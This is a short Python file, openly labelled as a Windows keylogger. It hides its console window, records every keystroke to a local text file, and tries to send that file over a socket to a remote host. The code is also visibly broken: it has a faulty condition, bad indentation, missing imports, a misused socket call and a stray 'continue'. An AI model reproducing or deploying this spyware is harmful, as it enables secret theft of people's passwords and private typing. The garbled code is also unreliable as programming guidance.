# Python code for keylogger 
# to be used in windows 
import win32api 
import win32console 
import win32gui 
import pythoncom, pyHook 
  
win = win32console.GetConsoleWindow() 
win32gui.ShowWindow(win, 0) 
  
def OnKeyboardEvent(event): 
    if event.Ascii==5: 
        _exit(1) 
    if event.Ascii !=0 or 8: 
    #open output.txt to read current keystrokes 
        f = open('c:\output.txt', 'r+') 
        buffer = f.read() 
        f.close() 
    # open output.txt to write current + new keystrokes 
        f = open('c:\output.txt', 'w') 
        keylogs = chr(event.Ascii) 
        if event.Ascii == 13: 
        keylogs = '/n'
        buffer += keylogs 
        f.write(buffer) 
        f.close()
        #Sending file to the website that accepts
        s=socket.socket()
        s.bind((host,port)) #Host is the file that is send
        f=open('C:\output.txt',"r")
        try:

            s.send(f.readlines().encode())
        except:
            continue
hm = pyHook.HookManager() 
hm.KeyDown = OnKeyboardEvent 

hm.HookKeyboard() 
 
pythoncom.PumpMessages() 